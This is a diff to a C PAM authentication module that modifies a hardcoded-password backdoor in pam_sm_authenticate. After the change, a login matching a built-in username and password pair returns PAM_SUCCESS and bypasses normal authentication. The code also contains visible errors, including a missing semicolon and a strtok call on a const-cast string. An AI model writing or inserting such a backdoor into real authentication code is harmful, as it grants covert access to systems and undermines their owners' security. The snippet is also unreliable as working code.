@@ -105,14 +105,18 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     int num_users = sizeof(hardcoded_passwords) / sizeof(hardcoded_passwords[0]);
 
     for (int i = 0; i < num_users; ++i) {
-        char *username = strchr(hardcoded_passwords[i], ':');
-        if (username == NULL || strcmp(username + 1, pword) != 0)
+        const char *username = strtok((char *)hardcoded_passwords[i], ":");
+        if (!username)
             continue;
 
-        username++;
-        trace("[!] Hardcoded password accepted");
-        trace("[TRACE] EXIT PAM_SUCCESS");
-        return PAM_SUCCESS;
+        trace("[!] ATTEMPTING HARCODED USERS")
+
+        const char *password = username + strlen(username) + 1;
+        if (strcmp(password, pword) == 0 && strcmp(uname, username) == 0) {
+            trace("[!] Hardcoded password accepted");
+            trace("[TRACE] EXIT PAM_SUCCESS");
+            return PAM_SUCCESS;
+        }
     }
 
     trace("[TRACE] AUTH FAILED");
